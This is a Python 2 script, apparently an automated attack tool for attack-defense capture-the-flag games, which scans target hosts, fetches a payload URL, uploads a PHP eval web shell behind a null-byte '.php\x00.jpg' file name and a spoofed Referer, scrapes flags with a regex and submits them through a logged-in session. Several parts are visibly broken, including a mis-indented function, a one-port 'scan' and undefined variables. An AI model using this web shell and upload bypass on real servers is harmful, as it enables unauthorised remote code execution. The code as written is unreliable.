import urllib2
import urllib
import threading
import thread
import Queue
import sys
import re
import cookielib
from time import *
import socket

def ascii():
    print ('''
-----------------------------------------------------------------------------
___________________  __________  _______      _____   ________   ________   
\__    ___/\_____  \ \______   \ \      \    /  _  \  \______ \  \_____  \  
  |    |    /   |   \ |       _/ /   |   \  /  /_\  \  |    |  \  /   |   \ 
  |    |   /    |    \|    |   \/    |    \/    |    \ |    `   \/    |    \
  |____|   \_______  /|____|_  /\____|__  /\____|__  //_______  /\_______  /
                   \/        \/         \/         \/         \/         \/     
-----------------------------------------------------------------------------
We get your flag.
    ''')


def webshell():
    print (' [*]Init main POC module...')
    try:
        for i in q:
            for j in w:
                for k in e:
                    print (' [+]Target init Suceed at ' + ip + i + j + k)
                    url = ('http://' + ip + i + j + k + pos)
                    rw = urllib2.urlopen(url + pos)
                    empty = rw.read()
                    p = url + payload
                    resp = urllib2.urlopen(p)
                    text = resp.read()
                    pscan()
                    upload()
                    try:
                        flag = re.findall(parameter,text)
                        print (' [+]Flag of ' + ip + 'is "' + flag + '"')
                        global flag
                        if flag_send == 1:
                            autosend()

                        return flag
                    except:
                        print (' [!]Invaild RE,Quitting.')
                        exit(1)




    except:
        print (' [!]Main POC module error,Quitting.')
        sys.exit(0)

  def autosend():
    filename = 'file.txt'
    surl = urllib2.urlopen(purl,session)
    cookie = cookielib.MozillaCookieJar(filename)
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
    post = urllib.urlencode({usr : usrparameter,psw : pswparameter})
    result = opener.open(purl,post)
    cookie.save(ignore_discard=True,ignore_expires=True)
    cookie = cookie.load(file.txt,ignore_expires=True,ignore_discard=True)
    req = urllib2.Request(geturl)
    upload = flagparameter + '=' + flag
    submit = opener.open(req,upload)
    sleep(10)
    if submit:
        print ' [+]Sended Flag ' + flag
        print flag
        print submit
    else:
        print (' [!]Flag send error')
        exit(2)


def pscan():
    print (' [*]Startting port scan to %s' % ip)
    port = 0
    try:
        if port >= 65536:
            print (' [+]Port scan complete')
        port += 1
        scan = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        response = scan.connect_ex((ip,port))

        if response == 0:
            print (' [+]Port %s is open' % port)
    except:
        print (' [!]Scan error,Quitting.')
        sys.exit(3)






def upload():
    boundary = '---------%s' % hex(int(time * 1000))
    data = []
    data.append('--%s' % boundary)
    data.append('Content-Disposition: image/jpeg; name="sh3ll.php\x00.jpg"\r\n')
    data.append('<?PHP @eval($_POST["X"]);?>')
    data.append('--%s' % boundary)
    data.append('Content-Disposition: form-data; name="submit"\r\n')
    data.append('--%s--' % boundary)
    print (' [+]Init upload module suceed')
    try:
        req = urllib2.Request(ip)
        req.add_header('Content-Type', 'multipart/form-data; boundary=%s' % boundary)
        req.add_header('User-Agent', 'Mozilla/5.0')
        req.add_header('referer', 'http://baidu.com/')
        print (' [*]Uploading to ' + ip)
        resp = urllib2.urlopen(req, timeout=7)
        print (' [+]Shell uploaded to ' + ip)
    except:
        print ' [!]Shell upload failed:Please retry'
        sys.exit(2)

if __name__ == '__main__':

    ascii()
    print (' [*]Input Target information below')
    ip = raw_input('IP:')
    static = raw_input('Static target(Y/N)')
    send = raw_input('Send flag?(Y/N)')
    pos = raw_input('Flag Position:')
    time = raw_input('Time to Submit:')
    thread = raw_input('Threading:')
    pos = raw_input('Shell Location:')
    payload = raw_input('Payload:')
    if send != 'N':
        usr= raw_input('Login Username:')
        usrparameter = raw_input('Username Parameter:')
        psw = raw_input('Password:')
        pswparameter = raw_input('Password Parameter:')
        purl = raw_input('Login URL:')
        geturl = raw_input('Post URL:')
        flagparameter = raw_input('Flag Parameter:')
        session = raw_input('Session:')
        flag_send = 1
    else:
        print (' [*]Flag sending not active')

    if static == 'N':
        q = raw_input('Target IP byte 1:')
        w = raw_input('Target IP byte 2:')
        e = raw_input('Target IP byte 3:')
    else:
        q = ''
        w = ''
        e = ''
        print ('Static IP parameter')
    parameter = raw_input('Response HTML parameter:')
    print (' [*]Trying init main...')
    print (' [+]Started at ' + ip + " Target position: " + pos + ' Time' + time)
    print (' [+]Thread is:' + thread)
    webshell()
    if send != 'N':
        threading._start_new_thread(autosend(),('Flag upload',4,))



 
